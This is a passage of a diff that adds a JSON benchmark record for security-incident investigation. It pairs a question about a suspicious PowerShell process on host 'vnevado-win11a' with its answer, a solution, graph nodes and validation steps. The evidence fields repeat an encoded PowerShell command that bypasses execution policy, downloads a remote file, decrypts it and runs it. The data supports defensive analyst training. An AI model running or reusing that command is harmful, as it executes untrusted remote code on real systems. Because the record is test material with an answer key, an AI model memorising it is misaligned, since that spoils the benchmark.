@@ -1,0 +1,851 @@
+{
+  "id": "incident_38_train_001",
+  "source_file": "data/excytin-bench/huggingface/questions/train/incident_38_qa_incident_o1-ga_c42.json",
+  "index": 1,
+  "sha256": "32a38ed62884552afc21824ce5b605fed97a821f591188826c1f832a343fa31b",
+  "split": "train",
+  "question_record": {
+    "context": "An unexpected behavior was observed for the process `notepad.exe` with the Process ID `8932` and IP address `202.183.149.174`. This process ran with no command line arguments on the 4th of July, 2024. The legitimate process by this name does not normally exhibit this behavior when ran with no command line arguments and may contain injected extraneous code or be a malicious executable masquerading as legitimate. It is part of a broader security incident which also includes suspicious application window discovery where attackers might be gathering information about a target device or network.",
+    "question": "What is the Process ID and created time of the suspicious powershell.exe process used in the application window discovery alert?",
+    "answer": "Process ID: 7472, Created Time: 2024-06-26t15:49:15.7860486z",
+    "solution": [
+      "Unexpected behavior was observed on the host `vnevado-win11a`, indicating potential code injection or a malicious executable masquerading as a legitimate one.",
+      "A suspicious application window discovery was performed using the process `powershell.exe` with Process ID `7472`, created at `2024-06-26t15:49:15.7860486z`."
+    ],
+    "start_alert": 15,
+    "end_alert": 0,
+    "start_entities": [
+      11,
+      12,
+      16
+    ],
+    "end_entities": [
+      5
+    ],
+    "shortest_alert_path": [
+      15,
+      8,
+      0
+    ]
+  },
+  "graph_file": "data/excytin-bench/github/secgym/qagen/graph_files/incident_38.graphml",
+  "graph_sha256": "740c5641e2ee770182a0bb99f0fc5c0d7b0fdaafc4eddcc144168a1bfe9366fc",
+  "path": [
+    "15",
+    "8",
+    "0"
+  ],
+  "nodes": {
+    "11": {
+      "type": "entity",
+      "node_type": "process",
+      "identifier_fields": "ProcessId__CreatedTimeUtc__CommandLine",
+      "value": "8932__2024-06-26t15:49:51.3043595z__\"notepad.exe\""
+    },
+    "12": {
+      "type": "entity",
+      "node_type": "process",
+      "identifier_fields": "ExtractedFileName",
+      "value": "notepad.exe"
+    },
+    "16": {
+      "type": "entity",
+      "node_type": "ip",
+      "identifier_fields": "Address",
+      "value": "202.183.149.174"
+    },
+    "15": {
+      "type": "alert",
+      "name": "Unexpected behavior observed by a process ran with no command line arguments",
+      "description": "The legitimate process by this name does not normally exhibit this behavior when ran with no command line arguments. \nSuch unexpected behavior may be a result of extraneous code injected into a legitimate process, or a malicious executable masquerading as the legitimate one by name."
+    },
+    "8": {
+      "type": "entity",
+      "node_type": "host",
+      "identifier_fields": "HostName",
+      "value": "vnevado-win11a"
+    },
+    "0": {
+      "type": "alert",
+      "name": "Suspicious Application Window Discovery",
+      "description": "A known tool or technique was used to gather information on this device. Attackers might be trying to gather information about the target device or network for later attacks."
+    },
+    "5": {
+      "type": "entity",
+      "node_type": "process",
+      "identifier_fields": "ProcessId__CreatedTimeUtc__CommandLine",
+      "value": "7472__2024-06-26t15:49:15.7860486z__powershell.exe"
+    }
+  },
+  "interpretation": {
+    "alerts": 2,
+    "sql_steps_per_variant": 2,
+    "start_alternatives": [
+      {
+        "node": "11",
+        "concept": "Process_Identity",
+        "value_literal_in_input": false,
+        "value_casefold_in_input": false
+      },
+      {
+        "node": "12",
+        "concept": "Command_File_Mention",
+        "value_literal_in_input": true,
+        "value_casefold_in_input": true
+      },
+      {
+        "node": "16",
+        "concept": "IP_Address",
+        "value_literal_in_input": true,
+        "value_casefold_in_input": true
+      }
+    ],
+    "target_concept": "Process_Identity",
+    "weak_links": [
+      "8"
+    ],
+    "scope": "official graph witness, not a proof of causality, actor identity or autonomous planning"
+  },
+  "merged_pm": "pm_2fffe0f0a23e0d55",
+  "merged_ems": [
+    "em_546045b7ece99c80",
+    "em_d1102041c654bb01",
+    "em_7eb864af9d22aeb3",
+    "em_8d6469f2573a39ce"
+  ],
+  "offline_validation": [
+    {
+      "variant": "from_Command_File_Mention",
+      "passed": true,
+      "steps": [
+        {
+          "step": "T1",
+          "status": "ok",
+          "row_count": 1,
+          "expected_node": "8",
+          "expected_present": true,
+          "values": [
+            "vnevado-win11a"
+          ],
+          "evidence": [
+            {
+              "concept": "Host_Name",
+              "graph_value": "vnevado-win11a",
+              "raw_components": {
+                "HostName": "vnevado-win11a"
+              },
+              "entity_index": 13,
+              "entity_ref": "15",
+              "roles": [],
+              "alert_id": "f9c9ba44-9510-fd11-3c50-336c83f62f8a",
+              "time": "2024-07-04 22:35:01.443868+00:00",
+              "matched_inputs": [
+                "notepad.exe"
+              ]
+            }
+          ]
+        },
+        {
+          "step": "T2",
+          "status": "ok",
+          "row_count": 2,
+          "expected_node": "5",
+          "expected_present": true,
+          "values": [
+            "4656__2024-06-26t15:49:41.4025245z__\"powershell.exe\" -executionpolicy bypass -encodedcommand wwboaguadaauafmazqbyahyaaqbjaguauabvagkabgb0ae0ayqbuageazwblahiaxqa6adoauwblagmadqbyagkadab5afaacgbvahqabwbjag8abaagad0aiabbae4azqb0ac4auwblagmadqbyagkadab5afaacgbvahqabwbjag8ababuahkacablaf0aoga6afqababzadeamga7acqaeabvahiaiaa9acaawwbtahkacwb0aguabqauafqazqb4ahqalgbfag4aywbvagqaaqbuagcaxqa6adoavqbuaeyaoaauaecazqb0aeiaeqb0aguacwaoaccavwbpag4aqqbuafaalqbjag4adabyag8alqbjag4aagblagmadabpag8abganackaowakagiayqbzaguanga0afmadabyagkabgbnacaapqagacgasqbuahyabwbragualqbxaguaygbsaguacqb1aguacwb0acaalqbvafiasqagaggadab0ahaacwa6ac8alwb3agmazabzahqayqb0agkaywbmagkabablahmacabyagqazqb1ahmalgbiagwabwbiac4aywbvahiazqauahcaaqbuagqabwb3ahmalgbuaguadaavahcaywbkahmadabhahqaaqbjagyaaqbsaguacwavafcaaqbuaeeavabqac0asqbuahqacgbvac0argbpagwazqbsaguacwbzac4adab4ahqaiaatafuacwblaeiayqbzagkaywbqageacgbzagkabgbnackalgbdag8abgb0aguabgb0adsavabyahkaewagacqaywbvag4adablag4adabcahkadablahmaiaa9acaawwbtahkacwb0aguabqauaemabwbuahyazqbyahqaxqa6adoargbyag8abqbcageacwbladyanabtahqacgbpag4azwaoacqaygbhahmazqa2adqauwb0ahiaaqbuagcakqagah0aiabdageadabjaggaiab7acaajabjag8abgb0aguabgb0aeiaeqb0aguacwagad0aiabbafmaeqbzahqazqbtac4aqwbvag4adgblahiadabdadoaogbgahiabwbtaeiayqbzaguanga0afmadabyagkabgbnacgajabiageacwbladyanabtahqacgbpag4azwauafmadqbiahmadabyagkabgbnacgamwapackaiab9adsajabpacaapqagadaaowagacqazablagmacgb5ahaadablagqaqgb5ahqazqbzacaapqagaeaakaapadsajabjag8abgb0aguabgb0aeiaeqb0aguacwauagyabwbyaguayqbjaggaewagacqazablagmacgb5ahaadablagqaqgb5ahqazqbzacaakwa9acaajabfacaalqbiahgabwbyacaajab4ag8acgbbacqaaqbdadsaiaakagkakwaradsaiabpagyaiaaoacqaaqagac0azqbxacaajab4ag8acgauaewazqbuagcadaboackaiab7acqaaqagad0aiaawah0aiab9adsasqbuahyabwbragualqbfahgacabyaguacwbzagkabwbuacaakabbafmaeqbzahqazqbtac4avablahgadaauaeuabgbjag8azabpag4azwbdadoaogbvafqarga4ac4arwblahqauwb0ahiaaqbuagcakaakagqazqbjahiaeqbwahqazqbkaeiaeqb0aguacwapacka -inputformat xml -outputformat text",
+            "7472__2024-06-26t15:49:15.7860486z__powershell.exe"
+          ],
+          "evidence": [
+            {
+              "concept": "Process_Identity",
+              "graph_value": "7472__2024-06-26t15:49:15.7860486z__powershell.exe",
+              "raw_components": {
+                "ProcessId": "7472",
+                "CreatedTimeUtc": "2024-06-26T15:49:15.7860486Z",
+                "CommandLine": "powershell.exe"
+              },
+              "entity_index": 2,
+              "entity_ref": "4",
+              "roles": [],
+              "alert_id": "197c2262-2cd9-4ca0-4c33-add856f8af63",
+              "time": "2024-07-04 22:35:00.593840+00:00",
+              "matched_inputs": [
+                "vnevado-win11a"
+              ]
+            },
+            {
+              "concept": "Process_Identity",
+              "graph_value": "4656__2024-06-26t15:49:41.4025245z__\"powershell.exe\" -executionpolicy bypass -encodedcommand wwboaguadaauafmazqbyahyaaqbjaguauabvagkabgb0ae0ayqbuageazwblahiaxqa6adoauwblagmadqbyagkadab5afaacgbvahqabwbjag8abaagad0aiabbae4azqb0ac4auwblagmadqbyagkadab5afaacgbvahqabwbjag8ababuahkacablaf0aoga6afqababzadeamga7acqaeabvahiaiaa9acaawwbtahkacwb0aguabqauafqazqb4ahqalgbfag4aywbvagqaaqbuagcaxqa6adoavqbuaeyaoaauaecazqb0aeiaeqb0aguacwaoaccavwbpag4aqqbuafaalqbjag4adabyag8alqbjag4aagblagmadabpag8abganackaowakagiayqbzaguanga0afmadabyagkabgbnacaapqagacgasqbuahyabwbragualqbxaguaygbsaguacqb1aguacwb0acaalqbvafiasqagaggadab0ahaacwa6ac8alwb3agmazabzahqayqb0agkaywbmagkabablahmacabyagqazqb1ahmalgbiagwabwbiac4aywbvahiazqauahcaaqbuagqabwb3ahmalgbuaguadaavahcaywbkahmadabhahqaaqbjagyaaqbsaguacwavafcaaqbuaeeavabqac0asqbuahqacgbvac0argbpagwazqbsaguacwbzac4adab4ahqaiaatafuacwblaeiayqbzagkaywbqageacgbzagkabgbnackalgbdag8abgb0aguabgb0adsavabyahkaewagacqaywbvag4adablag4adabcahkadablahmaiaa9acaawwbtahkacwb0aguabqauaemabwbuahyazqbyahqaxqa6adoargbyag8abqbcageacwbladyanabtahqacgbpag4azwaoacqaygbhahmazqa2adqauwb0ahiaaqbuagcakqagah0aiabdageadabjaggaiab7acaajabjag8abgb0aguabgb0aeiaeqb0aguacwagad0aiabbafmaeqbzahqazqbtac4aqwbvag4adgblahiadabdadoaogbgahiabwbtaeiayqbzaguanga0afmadabyagkabgbnacgajabiageacwbladyanabtahqacgbpag4azwauafmadqbiahmadabyagkabgbnacgamwapackaiab9adsajabpacaapqagadaaowagacqazablagmacgb5ahaadablagqaqgb5ahqazqbzacaapqagaeaakaapadsajabjag8abgb0aguabgb0aeiaeqb0aguacwauagyabwbyaguayqbjaggaewagacqazablagmacgb5ahaadablagqaqgb5ahqazqbzacaakwa9acaajabfacaalqbiahgabwbyacaajab4ag8acgbbacqaaqbdadsaiaakagkakwaradsaiabpagyaiaaoacqaaqagac0azqbxacaajab4ag8acgauaewazqbuagcadaboackaiab7acqaaqagad0aiaawah0aiab9adsasqbuahyabwbragualqbfahgacabyaguacwbzagkabwbuacaakabbafmaeqbzahqazqbtac4avablahgadaauaeuabgbjag8azabpag4azwbdadoaogbvafqarga4ac4arwblahqauwb0ahiaaqbuagcakaakagqazqbjahiaeqbwahqazqbkaeiaeqb0aguacwapacka -inputformat xml -outputformat text",
+              "raw_components": {
+                "ProcessId": "4656",
+                "CreatedTimeUtc": "2024-06-26T15:49:41.4025245Z",
+                "CommandLine": "\"powershell.exe\" -executionpolicy bypass -encodedCommand WwBOAGUAdAAuAFMAZQByAHYAaQBjAGUAUABvAGkAbgB0AE0AYQBuAGEAZwBlAHIAXQA6ADoAUwBlAGMAdQByAGkAdAB5AFAAcgBvAHQAbwBjAG8AbAAgAD0AIABbAE4AZQB0AC4AUwBlAGMAdQByAGkAdAB5AFAAcgBvAHQAbwBjAG8AbABUAHkAcABlAF0AOgA6AFQAbABzADEAMgA7ACQAeABvAHIAIAA9ACAAWwBTAHkAcwB0AGUAbQAuAFQAZQB4AHQALgBFAG4AYwBvAGQAaQBuAGcAXQA6ADoAVQBUAEYAOAAuAEcAZQB0AEIAeQB0AGUAcwAoACcAVwBpAG4AQQBUAFAALQBJAG4AdAByAG8ALQBJAG4AagBlAGMAdABpAG8AbgAnACkAOwAkAGIAYQBzAGUANgA0AFMAdAByAGkAbgBnACAAPQAgACgASQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAFIASQAgAGgAdAB0AHAAcwA6AC8ALwB3AGMAZABzAHQAYQB0AGkAYwBmAGkAbABlAHMAcAByAGQAZQB1AHMALgBiAGwAbwBiAC4AYwBvAHIAZQAuAHcAaQBuAGQAbwB3AHMALgBuAGUAdAAvAHcAYwBkAHMAdABhAHQAaQBjAGYAaQBsAGUAcwAvAFcAaQBuAEEAVABQAC0ASQBuAHQAcgBvAC0ARgBpAGwAZQBsAGUAcwBzAC4AdAB4AHQAIAAtAFUAcwBlAEIAYQBzAGkAYwBQAGEAcgBzAGkAbgBnACkALgBDAG8AbgB0AGUAbgB0ADsAVAByAHkAewAgACQAYwBvAG4AdABlAG4AdABCAHkAdABlAHMAIAA9ACAAWwBTAHkAcwB0AGUAbQAuAEMAbwBuAHYAZQByAHQAXQA6ADoARgByAG8AbQBCAGEAcwBlADYANABTAHQAcgBpAG4AZwAoACQAYgBhAHMAZQA2ADQAUwB0AHIAaQBuAGcAKQAgAH0AIABDAGEAdABjAGgAIAB7ACAAJABjAG8AbgB0AGUAbgB0AEIAeQB0AGUAcwAgAD0AIABbAFMAeQBzAHQAZQBtAC4AQwBvAG4AdgBlAHIAdABdADoAOgBGAHIAbwBtAEIAYQBzAGUANgA0AFMAdAByAGkAbgBnACgAJABiAGEAcwBlADYANABTAHQAcgBpAG4AZwAuAFMAdQBiAHMAdAByAGkAbgBnACgAMwApACkAIAB9ADsAJABpACAAPQAgADAAOwAgACQAZABlAGMAcgB5AHAAdABlAGQAQgB5AHQAZQBzACAAPQAgAEAAKAApADsAJABjAG8AbgB0AGUAbgB0AEIAeQB0AGUAcwAuAGYAbwByAGUAYQBjAGgAewAgACQAZABlAGMAcgB5AHAAdABlAGQAQgB5AHQAZQBzACAAKwA9ACAAJABfACAALQBiAHgAbwByACAAJAB4AG8AcgBbACQAaQBdADsAIAAkAGkAKwArADsAIABpAGYAIAAoACQAaQAgAC0AZQBxACAAJAB4AG8AcgAuAEwAZQBuAGcAdABoACkAIAB7ACQAaQAgAD0AIAAwAH0AIAB9ADsASQBuAHYAbwBrAGUALQBFAHgAcAByAGUAcwBzAGkAbwBuACAAKABbAFMAeQBzAHQAZQBtAC4AVABlAHgAdAAuAEUAbgBjAG8AZABpAG4AZwBdADoAOgBVAFQARgA4AC4ARwBlAHQAUwB0AHIAaQBuAGcAKAAkAGQAZQBjAHIAeQBwAHQAZQBkAEIAeQB0AGUAcwApACkA -inputFormat xml -outputFormat text"
+              },
+              "entity_index": 12,
+              "entity_ref": "14",
+              "roles": [],
+              "alert_id": "197c2262-2cd9-4ca0-4c33-add856f8af63",
+              "time": "2024-07-04 22:35:00.593840+00:00",
+              "matched_inputs": [
+                "vnevado-win11a"
+              ]
+            }
+          ]
+        }
+      ]
+    },
+    {
+      "variant": "from_IP_Address",
+      "passed": true,
+      "steps": [
+        {
+          "step": "T1",
+          "status": "ok",
+          "row_count": 1,
+          "expected_node": "8",
+          "expected_present": true,
+          "values": [
+            "vnevado-win11a"
+          ],
+          "evidence": [
+            {
+              "concept": "Host_Name",
+              "graph_value": "vnevado-win11a",
+              "raw_components": {
+                "HostName": "vnevado-win11a"
+              },
+              "entity_index": 13,
+              "entity_ref": "15",
+              "roles": [],
+              "alert_id": "f9c9ba44-9510-fd11-3c50-336c83f62f8a",
+              "time": "2024-07-04 22:35:01.443868+00:00",
+              "matched_inputs": [
+                "202.183.149.174"
+              ]
+            }
+          ]
+        },
+        {
+          "step": "T2",
+          "status": "ok",
+          "row_count": 2,
+          "expected_node": "5",
+          "expected_present": true,
+          "values": [
+            "4656__2024-06-26t15:49:41.4025245z__\"powershell.exe\" -executionpolicy bypass -encodedcommand wwboaguadaauafmazqbyahyaaqbjaguauabvagkabgb0ae0ayqbuageazwblahiaxqa6adoauwblagmadqbyagkadab5afaacgbvahqabwbjag8abaagad0aiabbae4azqb0ac4auwblagmadqbyagkadab5afaacgbvahqabwbjag8ababuahkacablaf0aoga6afqababzadeamga7acqaeabvahiaiaa9acaawwbtahkacwb0aguabqauafqazqb4ahqalgbfag4aywbvagqaaqbuagcaxqa6adoavqbuaeyaoaauaecazqb0aeiaeqb0aguacwaoaccavwbpag4aqqbuafaalqbjag4adabyag8alqbjag4aagblagmadabpag8abganackaowakagiayqbzaguanga0afmadabyagkabgbnacaapqagacgasqbuahyabwbragualqbxaguaygbsaguacqb1aguacwb0acaalqbvafiasqagaggadab0ahaacwa6ac8alwb3agmazabzahqayqb0agkaywbmagkabablahmacabyagqazqb1ahmalgbiagwabwbiac4aywbvahiazqauahcaaqbuagqabwb3ahmalgbuaguadaavahcaywbkahmadabhahqaaqbjagyaaqbsaguacwavafcaaqbuaeeavabqac0asqbuahqacgbvac0argbpagwazqbsaguacwbzac4adab4ahqaiaatafuacwblaeiayqbzagkaywbqageacgbzagkabgbnackalgbdag8abgb0aguabgb0adsavabyahkaewagacqaywbvag4adablag4adabcahkadablahmaiaa9acaawwbtahkacwb0aguabqauaemabwbuahyazqbyahqaxqa6adoargbyag8abqbcageacwbladyanabtahqacgbpag4azwaoacqaygbhahmazqa2adqauwb0ahiaaqbuagcakqagah0aiabdageadabjaggaiab7acaajabjag8abgb0aguabgb0aeiaeqb0aguacwagad0aiabbafmaeqbzahqazqbtac4aqwbvag4adgblahiadabdadoaogbgahiabwbtaeiayqbzaguanga0afmadabyagkabgbnacgajabiageacwbladyanabtahqacgbpag4azwauafmadqbiahmadabyagkabgbnacgamwapackaiab9adsajabpacaapqagadaaowagacqazablagmacgb5ahaadablagqaqgb5ahqazqbzacaapqagaeaakaapadsajabjag8abgb0aguabgb0aeiaeqb0aguacwauagyabwbyaguayqbjaggaewagacqazablagmacgb5ahaadablagqaqgb5ahqazqbzacaakwa9acaajabfacaalqbiahgabwbyacaajab4ag8acgbbacqaaqbdadsaiaakagkakwaradsaiabpagyaiaaoacqaaqagac0azqbxacaajab4ag8acgauaewazqbuagcadaboackaiab7acqaaqagad0aiaawah0aiab9adsasqbuahyabwbragualqbfahgacabyaguacwbzagkabwbuacaakabbafmaeqbzahqazqbtac4avablahgadaauaeuabgbjag8azabpag4azwbdadoaogbvafqarga4ac4arwblahqauwb0ahiaaqbuagcakaakagqazqbjahiaeqbwahqazqbkaeiaeqb0aguacwapacka -inputformat xml -outputformat text",
+            "7472__2024-06-26t15:49:15.7860486z__powershell.exe"
+          ],
+          "evidence": [
+            {
+              "concept": "Process_Identity",
+              "graph_value": "7472__2024-06-26t15:49:15.7860486z__powershell.exe",
+              "raw_components": {
+                "ProcessId": "7472",
+                "CreatedTimeUtc": "2024-06-26T15:49:15.7860486Z",
+                "CommandLine": "powershell.exe"
+              },
+              "entity_index": 2,
+              "entity_ref": "4",
+              "roles": [],
+              "alert_id": "197c2262-2cd9-4ca0-4c33-add856f8af63",
+              "time": "2024-07-04 22:35:00.593840+00:00",
+              "matched_inputs": [
+                "vnevado-win11a"
+              ]
+            },
+            {
+              "concept": "Process_Identity",
+              "graph_value": "4656__2024-06-26t15:49:41.4025245z__\"powershell.exe\" -executionpolicy bypass -encodedcommand wwboaguadaauafmazqbyahyaaqbjaguauabvagkabgb0ae0ayqbuageazwblahiaxqa6adoauwblagmadqbyagkadab5afaacgbvahqabwbjag8abaagad0aiabbae4azqb0ac4auwblagmadqbyagkadab5afaacgbvahqabwbjag8ababuahkacablaf0aoga6afqababzadeamga7acqaeabvahiaiaa9acaawwbtahkacwb0aguabqauafqazqb4ahqalgbfag4aywbvagqaaqbuagcaxqa6adoavqbuaeyaoaauaecazqb0aeiaeqb0aguacwaoaccavwbpag4aqqbuafaalqbjag4adabyag8alqbjag4aagblagmadabpag8abganackaowakagiayqbzaguanga0afmadabyagkabgbnacaapqagacgasqbuahyabwbragualqbxaguaygbsaguacqb1aguacwb0acaalqbvafiasqagaggadab0ahaacwa6ac8alwb3agmazabzahqayqb0agkaywbmagkabablahmacabyagqazqb1ahmalgbiagwabwbiac4aywbvahiazqauahcaaqbuagqabwb3ahmalgbuaguadaavahcaywbkahmadabhahqaaqbjagyaaqbsaguacwavafcaaqbuaeeavabqac0asqbuahqacgbvac0argbpagwazqbsaguacwbzac4adab4ahqaiaatafuacwblaeiayqbzagkaywbqageacgbzagkabgbnackalgbdag8abgb0aguabgb0adsavabyahkaewagacqaywbvag4adablag4adabcahkadablahmaiaa9acaawwbtahkacwb0aguabqauaemabwbuahyazqbyahqaxqa6adoargbyag8abqbcageacwbladyanabtahqacgbpag4azwaoacqaygbhahmazqa2adqauwb0ahiaaqbuagcakqagah0aiabdageadabjaggaiab7acaajabjag8abgb0aguabgb0aeiaeqb0aguacwagad0aiabbafmaeqbzahqazqbtac4aqwbvag4adgblahiadabdadoaogbgahiabwbtaeiayqbzaguanga0afmadabyagkabgbnacgajabiageacwbladyanabtahqacgbpag4azwauafmadqbiahmadabyagkabgbnacgamwapackaiab9adsajabpacaapqagadaaowagacqazablagmacgb5ahaadablagqaqgb5ahqazqbzacaapqagaeaakaapadsajabjag8abgb0aguabgb0aeiaeqb0aguacwauagyabwbyaguayqbjaggaewagacqazablagmacgb5ahaadablagqaqgb5ahqazqbzacaakwa9acaajabfacaalqbiahgabwbyacaajab4ag8acgbbacqaaqbdadsaiaakagkakwaradsaiabpagyaiaaoacqaaqagac0azqbxacaajab4ag8acgauaewazqbuagcadaboackaiab7acqaaqagad0aiaawah0aiab9adsasqbuahyabwbragualqbfahgacabyaguacwbzagkabwbuacaakabbafmaeqbzahqazqbtac4avablahgadaauaeuabgbjag8azabpag4azwbdadoaogbvafqarga4ac4arwblahqauwb0ahiaaqbuagcakaakagqazqbjahiaeqbwahqazqbkaeiaeqb0aguacwapacka -inputformat xml -outputformat text",
+              "raw_components": {
+                "ProcessId": "4656",
+                "CreatedTimeUtc": "2024-06-26T15:49:41.4025245Z",
+                "CommandLine": "\"powershell.exe\" -executionpolicy bypass -encodedCommand WwBOAGUAdAAuAFMAZQByAHYAaQBjAGUAUABvAGkAbgB0AE0AYQBuAGEAZwBlAHIAXQA6ADoAUwBlAGMAdQByAGkAdAB5AFAAcgBvAHQAbwBjAG8AbAAgAD0AIABbAE4AZQB0AC4AUwBlAGMAdQByAGkAdAB5AFAAcgBvAHQAbwBjAG8AbABUAHkAcABlAF0AOgA6AFQAbABzADEAMgA7ACQAeABvAHIAIAA9ACAAWwBTAHkAcwB0AGUAbQAuAFQAZQB4AHQALgBFAG4AYwBvAGQAaQBuAGcAXQA6ADoAVQBUAEYAOAAuAEcAZQB0AEIAeQB0AGUAcwAoACcAVwBpAG4AQQBUAFAALQBJAG4AdAByAG8ALQBJAG4AagBlAGMAdABpAG8AbgAnACkAOwAkAGIAYQBzAGUANgA0AFMAdAByAGkAbgBnACAAPQAgACgASQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAFIASQAgAGgAdAB0AHAAcwA6AC8ALwB3AGMAZABzAHQAYQB0AGkAYwBmAGkAbABlAHMAcAByAGQAZQB1AHMALgBiAGwAbwBiAC4AYwBvAHIAZQAuAHcAaQBuAGQAbwB3AHMALgBuAGUAdAAvAHcAYwBkAHMAdABhAHQAaQBjAGYAaQBsAGUAcwAvAFcAaQBuAEEAVABQAC0ASQBuAHQAcgBvAC0ARgBpAGwAZQBsAGUAcwBzAC4AdAB4AHQAIAAtAFUAcwBlAEIAYQBzAGkAYwBQAGEAcgBzAGkAbgBnACkALgBDAG8AbgB0AGUAbgB0ADsAVAByAHkAewAgACQAYwBvAG4AdABlAG4AdABCAHkAdABlAHMAIAA9ACAAWwBTAHkAcwB0AGUAbQAuAEMAbwBuAHYAZQByAHQAXQA6ADoARgByAG8AbQBCAGEAcwBlADYANABTAHQAcgBpAG4AZwAoACQAYgBhAHMAZQA2ADQAUwB0AHIAaQBuAGcAKQAgAH0AIABDAGEAdABjAGgAIAB7ACAAJABjAG8AbgB0AGUAbgB0AEIAeQB0AGUAcwAgAD0AIABbAFMAeQBzAHQAZQBtAC4AQwBvAG4AdgBlAHIAdABdADoAOgBGAHIAbwBtAEIAYQBzAGUANgA0AFMAdAByAGkAbgBnACgAJABiAGEAcwBlADYANABTAHQAcgBpAG4AZwAuAFMAdQBiAHMAdAByAGkAbgBnACgAMwApACkAIAB9ADsAJABpACAAPQAgADAAOwAgACQAZABlAGMAcgB5AHAAdABlAGQAQgB5AHQAZQBzACAAPQAgAEAAKAApADsAJABjAG8AbgB0AGUAbgB0AEIAeQB0AGUAcwAuAGYAbwByAGUAYQBjAGgAewAgACQAZABlAGMAcgB5AHAAdABlAGQAQgB5AHQAZQBzACAAKwA9ACAAJABfACAALQBiAHgAbwByACAAJAB4AG8AcgBbACQAaQBdADsAIAAkAGkAKwArADsAIABpAGYAIAAoACQAaQAgAC0AZQBxACAAJAB4AG8AcgAuAEwAZQBuAGcAdABoACkAIAB7ACQAaQAgAD0AIAAwAH0AIAB9ADsASQBuAHYAbwBrAGUALQBFAHgAcAByAGUAcwBzAGkAbwBuACAAKABbAFMAeQBzAHQAZQBtAC4AVABlAHgAdAAuAEUAbgBjAG8AZABpAG4AZwBdADoAOgBVAFQARgA4AC4ARwBlAHQAUwB0AHIAaQBuAGcAKAAkAGQAZQBjAHIAeQBwAHQAZQBkAEIAeQB0AGUAcwApACkA -inputFormat xml -outputFormat text"
+              },
+              "entity_index": 12,
+              "entity_ref": "14",
+              "roles": [],
+              "alert_id": "197c2262-2cd9-4ca0-4c33-add856f8af63",
+              "time": "2024-07-04 22:35:00.593840+00:00",
+              "matched_inputs": [
+                "vnevado-win11a"
+              ]
+            }
+          ]
+        }
+      ]
+    },
+    {
+      "variant": "from_Process_Identity",
+      "passed": true,
+      "steps": [
+        {
+          "step": "T1",
+          "status": "ok",
+          "row_count": 1,
+          "expected_node": "8",
+          "expected_present": true,
+          "values": [
+            "vnevado-win11a"
+          ],
+          "evidence": [
+            {
+              "concept": "Host_Name",
+              "graph_value": "vnevado-win11a",
+              "raw_components": {
+                "HostName": "vnevado-win11a"
+              },
+              "entity_index": 13,
+              "entity_ref": "15",
+              "roles": [],
+              "alert_id": "f9c9ba44-9510-fd11-3c50-336c83f62f8a",
+              "time": "2024-07-04 22:35:01.443868+00:00",
+              "matched_inputs": [
+                "8932__2024-06-26t15:49:51.3043595z__\"notepad.exe\""
+              ]
+            }
+          ]
+        },
+        {
+          "step": "T2",
+          "status": "ok",
+          "row_count": 2,
+          "expected_node": "5",
+          "expected_present": true,
+          "values": [
+            "4656__2024-06-26t15:49:41.4025245z__\"powershell.exe\" -executionpolicy bypass -encodedcommand wwboaguadaauafmazqbyahyaaqbjaguauabvagkabgb0ae0ayqbuageazwblahiaxqa6adoauwblagmadqbyagkadab5afaacgbvahqabwbjag8abaagad0aiabbae4azqb0ac4auwblagmadqbyagkadab5afaacgbvahqabwbjag8ababuahkacablaf0aoga6afqababzadeamga7acqaeabvahiaiaa9acaawwbtahkacwb0aguabqauafqazqb4ahqalgbfag4aywbvagqaaqbuagcaxqa6adoavqbuaeyaoaauaecazqb0aeiaeqb0aguacwaoaccavwbpag4aqqbuafaalqbjag4adabyag8alqbjag4aagblagmadabpag8abganackaowakagiayqbzaguanga0afmadabyagkabgbnacaapqagacgasqbuahyabwbragualqbxaguaygbsaguacqb1aguacwb0acaalqbvafiasqagaggadab0ahaacwa6ac8alwb3agmazabzahqayqb0agkaywbmagkabablahmacabyagqazqb1ahmalgbiagwabwbiac4aywbvahiazqauahcaaqbuagqabwb3ahmalgbuaguadaavahcaywbkahmadabhahqaaqbjagyaaqbsaguacwavafcaaqbuaeeavabqac0asqbuahqacgbvac0argbpagwazqbsaguacwbzac4adab4ahqaiaatafuacwblaeiayqbzagkaywbqageacgbzagkabgbnackalgbdag8abgb0aguabgb0adsavabyahkaewagacqaywbvag4adablag4adabcahkadablahmaiaa9acaawwbtahkacwb0aguabqauaemabwbuahyazqbyahqaxqa6adoargbyag8abqbcageacwbladyanabtahqacgbpag4azwaoacqaygbhahmazqa2adqauwb0ahiaaqbuagcakqagah0aiabdageadabjaggaiab7acaajabjag8abgb0aguabgb0aeiaeqb0aguacwagad0aiabbafmaeqbzahqazqbtac4aqwbvag4adgblahiadabdadoaogbgahiabwbtaeiayqbzaguanga0afmadabyagkabgbnacgajabiageacwbladyanabtahqacgbpag4azwauafmadqbiahmadabyagkabgbnacgamwapackaiab9adsajabpacaapqagadaaowagacqazablagmacgb5ahaadablagqaqgb5ahqazqbzacaapqagaeaakaapadsajabjag8abgb0aguabgb0aeiaeqb0aguacwauagyabwbyaguayqbjaggaewagacqazablagmacgb5ahaadablagqaqgb5ahqazqbzacaakwa9acaajabfacaalqbiahgabwbyacaajab4ag8acgbbacqaaqbdadsaiaakagkakwaradsaiabpagyaiaaoacqaaqagac0azqbxacaajab4ag8acgauaewazqbuagcadaboackaiab7acqaaqagad0aiaawah0aiab9adsasqbuahyabwbragualqbfahgacabyaguacwbzagkabwbuacaakabbafmaeqbzahqazqbtac4avablahgadaauaeuabgbjag8azabpag4azwbdadoaogbvafqarga4ac4arwblahqauwb0ahiaaqbuagcakaakagqazqbjahiaeqbwahqazqbkaeiaeqb0aguacwapacka -inputformat xml -outputformat text",
+            "7472__2024-06-26t15:49:15.7860486z__powershell.exe"
+          ],
+          "evidence": [
+            {
+              "concept": "Process_Identity",
+              "graph_value": "7472__2024-06-26t15:49:15.7860486z__powershell.exe",
+              "raw_components": {
+                "ProcessId": "7472",
+                "CreatedTimeUtc": "2024-06-26T15:49:15.7860486Z",
+                "CommandLine": "powershell.exe"
+              },
+              "entity_index": 2,
+              "entity_ref": "4",
+              "roles": [],
+              "alert_id": "197c2262-2cd9-4ca0-4c33-add856f8af63",
+              "time": "2024-07-04 22:35:00.593840+00:00",
+              "matched_inputs": [
+                "vnevado-win11a"
+              ]
+            },
+            {
+              "concept": "Process_Identity",
